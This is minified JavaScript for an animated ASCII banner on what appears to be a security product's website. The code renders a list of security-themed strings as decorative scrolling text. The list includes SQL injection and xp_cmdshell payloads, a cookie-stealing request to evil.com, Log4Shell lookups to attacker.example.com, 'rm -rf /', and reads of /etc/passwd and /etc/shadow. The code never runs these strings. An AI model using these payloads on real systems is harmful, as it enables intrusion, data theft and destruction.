const he = [
  "' OR 1=1 --",
  "SELECT * FROM users WHERE password=''",
  "admin'; DROP TABLE sessions;--",
  "Authorization: Bearer ${stolen_jwt}",
  "if (role !== 'admin') return; // bypassed",
  "UNION SELECT password FROM users--",
  "eval(atob(payload))",
  "jwt.verify(token, 'weak-secret')",
  "req.headers['x-forwarded-for']='127.0.0.1'",
  "' AND 1=1; EXEC xp_cmdshell('whoami')--",
  "<script>document.cookie<\/script>",
  "fetch('/api/admin',{headers:auth})",
  "SELECT cc_number, cvv FROM payments",
  "Object.assign(proto, {isAdmin:true})",
  "require('child_process').exec(cmd)",
  "' UNION SELECT table_name FROM information_schema.tables--",
  "process.env.DATABASE_URL",
  "curl -X POST /api/auth -d 'grant_type=password'",
  "Buffer.allocUnsafe(1024).toString()",
  "new Function(userInput)()",
  "fs.readFile('/etc/passwd', cb)",
  "db.users.find({$gt: ''})",
  "assert role == 'admin' # bypassed",
  "res.setHeader('Access-Control-Allow-Origin','*')",
  "sudo rm -rf / --no-preserve-root",
  "SELECT LOAD_FILE('/etc/shadow')",
  "'; WAITFOR DELAY '0:0:5';--",
  "const token = localStorage.getItem('auth')",
  "XMLHttpRequest.open('GET','//evil.com?'+document.cookie)",
  "${jndi:ldap://attacker.example.com/a} // Log4Shell",
  "logger.error('${jndi:rmi://attacker.example.com/b}')",
  "import subprocess; subprocess.call(user_input, shell=True)",
  "UPDATE users SET role='superadmin' WHERE id=1",
  "response.redirect(req.query.next) // open redirect",
  "crypto.createHash('md5') // weak hash",
  "JSON.parse(req.body) // prototype pollution",
  "child_process.execSync('cat /etc/passwd')",
  "INSERT INTO logs VALUES(1, '${userInput}')",
  "os.system('ping -c1 ' + hostname)",
  "pickle.loads(untrusted_data)",
  "yaml.load(user_input) // RCE via deserialization",
  "render_template_string(user_input) // SSTI",
  "ssh -o StrictHostKeyChecking=no root@prod",
  "curl -k https://internal-api.local/debug",
  "password = 'Summer2024!'",
  "const apiKey = 'sk_live_exposed_in_client_bundle'",
  "verify=False # requests certificate validation disabled",
  "SELECT * FROM users INTO OUTFILE '/tmp/dump.csv'",
  "chmod 777 /var/www/uploads",
  "app.use(cors({ origin: '*' }))",
  "innerHTML = req.query.preview",
  "document.write(location.hash.slice(1))",
  "tar -xzvf backup.tar.gz -C / --no-same-owner",
  "kubectl create clusterrolebinding admin --clusterrole=cluster-admin",
  "helm install app . --set image.tag=latest",
  "openssl rsa -in private.pem -out decrypted.pem",
  "scp id_rsa ubuntu@bastion:/tmp/id_rsa",
  "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
  "-----BEGIN PRIVATE KEY-----",
  "SELECT pg_read_file('/etc/passwd')",
  'NoSQL: {"$where":"sleep(5000) || true"}',
  "res.send(req.query.html) // reflected XSS",
  "subprocess.Popen(command, shell=True)",
  "jwt.sign(payload, 'changeme')",
];
function at() {
  const ue = "__counterswarmAsciiHeroState",
    pe = window,
    ke = [
      "rgba(123, 106, 204, 0.18)",
      "rgba(149, 131, 219, 0.38)",
      "rgba(180, 164, 233, 0.62)",
      "rgba(212, 199, 246, 0.84)",
      "rgba(244, 239, 255, 1)",
    ],
    Fe = [
      "rgba(134, 116, 194, 0.2)",
      "rgba(96, 77, 158, 0.4)",
      "rgba(68, 53, 126, 0.64)",
      "rgba(42, 31, 90, 0.86)",
      "rgba(19, 14, 44, 1)",
    ],
    Pe = [
      "rgba(245, 245, 247, 0.78)",
      "rgba(48, 209, 88, 0.68)",
      "rgba(255, 69, 58, 0.72)",
      "rgba(191, 90, 242, 0.84)",
      "rgba(10, 132, 255, 0.76)",
    ],
    De = [
      "rgba(0, 0, 0, 0.72)",
      "rgba(8, 8, 8, 0.82)",
      "rgba(16, 16, 16, 0.9)",
      "rgba(24, 24, 24, 0.96)",
      "rgba(0, 0, 0, 1)",
    ],
    ze = [
      "rgba(255, 255, 255, 0.18)",
      "rgba(255, 255, 255, 0.32)",
      "rgba(255, 255, 255, 0.46)",
      "rgba(255, 255, 255, 0.62)",
      "rgba(255, 255, 255, 0.82)",
    ],
    me = (n, u, s) =>
      (Math.sin(n * 0.43 + u * 0.61 + s * 1.07) * 0.5 +
        Math.sin(n * 0.89 - u * 0.37 + s * 0.63) * 0.3 +
        Math.sin(n * 0.21 + u * 1.11 + s * 0.41) * 0.2) *
        0.5 +
      0.5,
    Q = (n) => Math.min(1, Math.max(0, n)),
    fe = (n) => 1 - Math.pow(1 - Q(n), 3),
    P = (n) => {
      const u = Math.sin(n * 12.9898 + 78.233) * 43758.5453;
      return u - Math.floor(u);
    },
    we = '"Geist Mono", monospace',
    qe = (n) => {
      const u = n.querySelector(".ascii-hero__canvas");
      if (!(u instanceof HTMLCanvasElement)) return () => {};
      const s = u.getContext("2d", { alpha: !0, desynchronized: !0 });
      if (!s) return () => {};
      const D = window.matchMedia("(prefers-reduced-motion: reduce)"),
        m = n.classList.contains("ascii-hero--background") || n.dataset.asciiBg === "true",
        ge = m && n.dataset.asciiIntroReveal === "true",
        I = m && n.dataset.asciiInteractiveReveal === "true",
        ee = n.dataset.asciiInteractiveRevealTone === "dark" ? "dark" : "light",
        Xe = 3600,
        Be = performance.now(),
        _ = Math.max(0.25, Number(n.dataset.asciiInteractiveRevealIntensity) || 1),
        be = 920 * Math.min(_, 2.2),
        Me = m ? 7 : 11,
        W = m ? 9 : 14,
        Ye = m ? 1e3 / 10 : 1e3 / 16,
        He = m ? 1.5 : 2;
      let V,
        te,
        y = 0,
        A = 0,
        z = 0,
        j = 0,
        ne = !document.hidden,
        se = !("IntersectionObserver" in window),
        b = 0,
        E = 0,
        p = null,
        O = [],
        re = 0,
        G = Number.NaN,
        ae = Number.NaN;
      const ve = 40;
      let q = [],
        X = [],
        oe = !1;
      const $e = n.classList.contains("ascii-hero__mark--upper") ? 1 : -1,
        R = I ? (ee === "dark" ? ze : De) : ge ? Pe : m ? Fe : ke,
        Ue = () => {
          if (b <= 0 || E <= 0) return !1;
          if (p) return p.length > 0;
          const o = Math.max(he.length, Math.ceil(E / W) + 4 * 2 + 8),
            r = b * (m ? 2.2 : 2.6),
            i = he.length,
            c = (Y, C) => {
              let l = (Y * 2654435761 + C * 340573321 + ($e > 0 ? 7 : 19)) >>> 0;
              return (
                (l = Math.imul(l ^ (l >>> 16), 73244475)),
                (l = Math.imul(l ^ (l >>> 16), 73244475)),
                (l = (l ^ (l >>> 16)) >>> 0),
                l % i
              );
            },
            S = s.measureText("M").width,
            B = S * 3;
          return (
            (p = Array.from({ length: o }, (Y, C) => {
              let l = "",
                H = 0,
                $ = 0;
              for (; H < r;) {
                const ie = c(C, $),
                  M = he[ie];
                ($ > 0 ? ((l += `   ${M}`), (H += B + M.length * S)) : ((l += M), (H += M.length * S)), $++);
              }
              return l;
            })),
            p.length > 0
          );
        },
        We = (e) => {
          if (oe) return;
          oe = !0;
          const o = p.length;
          ((X = Array.from({ length: e }, (r, i) => i % o)), (q = []));
          for (let r = 0; r < ve; r++) {
            const i = Math.floor((r / ve) * e),
              c = (X[i] + 1 + r * 3) % o,
              S = p[c];
            q.push({
              row: i,
              charPos: Math.floor(Math.random() * S.length * 0.7),
              newLineIdx: c,
              speed: 1.2 + Math.random() * 2,
            });
          }
        },
        Ve = () => {
          if (!I) return !0;
          const e = performance.now();
          return (
            (O = O.filter((o) => e - o.startedAt < be)),
            O.length === 0 ? (delete n.dataset.asciiRippling, !1) : !0
          );
        },
        Ee = () => {
          if (!Ue()) return;
          const e = 4,
            o = Math.ceil(E / W) + e * 2,
            r = z * 0.04,
            i = -b * 0.48,
            c = s.measureText("M").width,
            S = "█",
            B = p.length,
            Y = ge && !D.matches ? fe((performance.now() - Be) / Xe) : 1,
            C = Y < 1,
            l = Math.ceil(b / c) + 28;
          (We(o), s.clearRect(0, 0, b, E));
          const H = Ve();
          if (I && !H) return;
          const $ = (t, f, a, v) => {
              const x = P(f + 17) * 0.7,
                w = fe((Y - x) / 0.36);
              if (w <= 0) return;
              const d = Math.max(0, Math.floor(-i / c) - 24),
                g = Math.floor((P(f + 53) - 0.5) * 18),
                h = Math.max(0, d + g),
                N = Math.min(t.length, h + Math.ceil(w * (l + 36)));
              if (N <= h) return;
              const k = Math.min(1, 0.16 + w * 0.84);
              ((s.globalAlpha = k),
                (s.fillStyle = R[v]),
                s.fillText(t.slice(h, N), i + h * c, a),
                (s.globalAlpha = 1));
            },
            ie = (t, f, a) => {
              const v = Math.max(0, Math.floor(-i / c) - 4),
                x = Math.min(t.length, v + l + 36),
                w = performance.now();
              for (let d = v; d < x; d++) {
                const g = t[d];
                if (!g || g === " ") continue;
                const h = i + d * c,
                  N = h + c / 2,
                  k = a + W / 2,
                  F = me(d * 0.17, f * 0.31, r * 3.4),
                  ce = P(f * 131 + d * 17 + z * 11) > 0.982;
                let le = 0;
                for (const L of O) {
                  const U = Q((w - L.startedAt) / be),
                    Qe = Math.pow(1 - U, 2.25) * L.strength,
                    Ze = N - L.x,
                    et = k - L.y,
                    J = Math.hypot(Ze, et),
                    Ne =
                      Math.sin(J * 0.032 + L.seed + U * 4.5) * 3 +
                      Math.sin((h + a) * 0.014 + L.seed * 0.37) * 2,
                    tt = (58 - U * 14) * Math.min(_, 2),
                    nt = Math.exp(-Math.pow((J + Ne) / Math.max(tt, 34), 2)),
                    st =
                      0.18 *
                      Math.exp(
                        -Math.pow((J - (24 + U * 92 * Math.min(_, 2)) - Ne) / (30 * Math.min(_, 1.8)), 2),
                      ),
                    rt = 0.82 + 0.18 * Math.sin(J * 0.09 - U * 9 + L.seed);
                  le += (nt + st) * Qe * rt;
                }
                if (le < 0.015) continue;
                const de = Q(le * (0.42 + F * 0.28) + (ce ? 0.12 : 0)),
                  Ke = ce ? (P(d + f + z) - 0.5) * 1.3 : (F - 0.5) * 0.28,
                  Je = ce ? (P(d * 3 + f + z) - 0.5) * 0.8 : 0;
                ((s.fillStyle =
                  ee === "dark"
                    ? R[Math.min(R.length - 1, Math.floor(de * R.length))]
                    : `rgba(0, 0, 0, ${de})`),
                  (s.globalAlpha = ee === "dark" ? de : 1),
                  s.fillText(g, h + Ke, a + Je),
                  (s.globalAlpha = 1));
              }
            },
            M = new Set();
          if (!C && !I) {
            for (const t of q) M.add(t.row);
            for (const t of q) {
              const f = p[t.newLineIdx];
              if (((t.charPos += t.speed), t.charPos >= f.length)) {
                ((X[t.row] = t.newLineIdx), M.delete(t.row));
                let a,
                  v = 0;
                do ((a = Math.floor(Math.random() * o)), v++);
                while (M.has(a) && v < 30);
                ((t.row = a), M.add(a));
                const x = X[a] ?? a % B;
                ((t.newLineIdx = (x + 1 + Math.floor(Math.random() * 5)) % B),
                  (t.charPos = 0),
                  (t.speed = 2 + Math.random() * 3));
              }
            }
          }
          const Te = new Map();
          for (const t of q) Te.set(t.row, t);
          for (let t = 0; t < o; t++) {
            const a = (t - e) * W,
              x = 0.3 + me(t * 0.3, 0, r) * 0.7,
              w = Math.min(4, Math.floor(x * 5)),
              d = X[t] ?? t % B,
              g = p[d],
              h = Te.get(t);
            if (C) {
              $(g, t, a, w);
              continue;
            }
            if (I) {
              ie(g, t, a);
              continue;
            }
            if (h) {
              const N = p[h.newLineIdx],
                k = Math.floor(h.charPos),
                F = i + k * c;
              if (F <= 0) ((s.fillStyle = R[w]), s.fillText(g, i, a));
              else {
                const Ce = N.slice(0, k);
                ((s.fillStyle = R[w]),
                  s.fillText(Ce, i, a),
                  F < b &&
                    ((s.fillStyle = m ? "rgba(180, 164, 233, 0.95)" : "rgba(123, 106, 204, 0.85)"),
                    s.fillText(S, F, a)));
              }
            } else ((s.fillStyle = R[w]), s.fillText(g, i, a));
          }
        },
        K = () => {
          y && (window.cancelAnimationFrame(y), (y = 0), (j = 0));
        },
        je = () => {
          A && (window.cancelAnimationFrame(A), (A = 0));
        },
        Re = () => !D.matches && se && ne,
        Se = (e) => {
          ((y = 0),
            (!j || e - j >= Ye) && ((z += 1), (j = e), Ee()),
            Re() && (y = window.requestAnimationFrame(Se)));
        },
        T = () => {
          (K(), Ee(), Re() && (y = window.requestAnimationFrame(Se)));
        },
        Ge = (e, o) => {
          if (e <= 0 || o <= 0) return;
          const r = Math.max(1, Math.round(e)),
            i = Math.max(1, Math.round(o));
          if (r === b && i === E) return;
          ((b = r), (E = i));
          const c = Math.min(Math.max(window.devicePixelRatio || 1, 1), He);
          ((u.width = Math.round(b * c)),
            (u.height = Math.round(E * c)),
            s.setTransform(c, 0, 0, c, 0, 0),
            (s.font = m ? `600 ${Me}px ${we}` : `${Me}px ${we}`),
            (s.textBaseline = "top"),
            (p = null),
            (oe = !1),
            T());
        },
        xe = () => {
          const e = n.getBoundingClientRect();
          Ge(e.width, e.height);
        },
        Le = () => {
          A ||
            (A = window.requestAnimationFrame(() => {
              ((A = 0), xe());
            }));
        },
        Ie = () => {
          if (((ne = !document.hidden), !ne)) {
            K();
            return;
          }
          T();
        };
      if ("ResizeObserver" in window) ((V = new ResizeObserver(() => Le())), V.observe(n));
      else {
        const e = () => Le();
        (globalThis.addEventListener("resize", e),
          (V = {
            observe() {},
            disconnect() {
              globalThis.removeEventListener("resize", e);
            },
          }));
      }
      (xe(),
        "IntersectionObserver" in window &&
          ((te = new IntersectionObserver(
            ([e]) => {
              if (((se = !!e?.isIntersecting), !se)) {
                K();
                return;
              }
              T();
            },
            { threshold: 0.05 },
          )),
          te.observe(n)));
      const _e = () => T(),
        ye = (e, o) => {
          if (!I || D.matches) return;
          const r = n.getBoundingClientRect();
          e.clientX < r.left ||
            e.clientX > r.right ||
            e.clientY < r.top ||
            e.clientY > r.bottom ||
            ((O = [
              ...O.slice(-7),
              {
                x: e.clientX - r.left,
                y: e.clientY - r.top,
                startedAt: performance.now(),
                seed: Math.random() * 1e3,
                strength: o,
              },
            ]),
            (n.dataset.asciiRippling = "true"),
            T());
        },
        Ae = (e) => {
          const o = performance.now(),
            r = Number.isNaN(G) ? 1 / 0 : Math.hypot(e.clientX - G, e.clientY - ae);
          (o - re < 42 && r < 14) || ((re = o), (G = e.clientX), (ae = e.clientY), ye(e, 0.26 * _));
        },
        Oe = (e) => {
          ((re = performance.now()), (G = e.clientX), (ae = e.clientY), ye(e, 0.38 * _));
        };
      return (
        D.addEventListener("change", _e),
        document.addEventListener("visibilitychange", Ie),
        window.addEventListener("pointermove", Ae, { passive: !0 }),
        window.addEventListener("pointerdown", Oe, { passive: !0 }),
        T(),
        () => {
          (K(),
            je(),
            V?.disconnect(),
            te?.disconnect(),
            D.removeEventListener("change", _e),
            window.removeEventListener("pointermove", Ae),
            window.removeEventListener("pointerdown", Oe),
            document.removeEventListener("visibilitychange", Ie));
        }
      );
    };
  if (pe[ue]?.initialized) return;
  const Z = {
    initialized: !0,
    cleanups: [],
    cleanup() {
      for (const n of this.cleanups) n();
      this.cleanups = [];
    },
    refresh() {
      (this.cleanup(),
        (this.cleanups = Array.from(document.querySelectorAll("[data-ascii-hero]")).map((n) => qe(n))));
    },
  };
  ((pe[ue] = Z), Z.refresh(), document.addEventListener("astro:page-load", () => Z.refresh()));
}
at();
